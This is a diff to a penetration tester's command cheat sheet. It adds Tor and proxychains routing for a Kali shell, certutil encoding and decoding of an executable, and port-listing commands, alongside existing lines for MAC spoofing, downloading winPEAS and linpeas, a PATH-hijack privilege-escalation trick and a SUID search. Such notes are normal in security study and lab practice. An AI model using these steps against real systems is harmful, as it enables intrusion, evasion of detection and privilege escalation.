@@ -25,9 +25,9 @@ openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
 sudo ifconfig en0 ether  <MAC address>
 
 # Kali terminal setup (podman, docker)
-apt install proxychains4 nmap metasploit-framework sqlmap links neovim tor curl golang fish
-tor &
-proxychains4 -q fish
+apt install proxychains4 torsocks nmap metasploit-framework sqlmap links neovim tor curl golang fish
+torsocks fish
+proxychains -q fish
 curl https://www.get-my-ip.info/api/ip
 
 # Micro editor setup
@@ -161,6 +161,10 @@ XAMPP 	C:\xampp\htdocs\
 Download:
 https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
 
+# Certutil (windows, certutil)
+certutil -encode tool.exe app.txt
+certutil -decode app.txt tool.exe
+
 # LinPeas (linpeas, linux, priv)
 Download:
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
@@ -259,6 +263,10 @@ which tar
 echo "/bin/bash" > tar
 echo $PATH
 export PATH=/tmp:$PATH
+
+# NETSTAT (netstat, ports, services)
+lsof -i -P -N
+ss -tlnp
 
 # find suid binaries
 find / -perm -4000 2>/dev/null
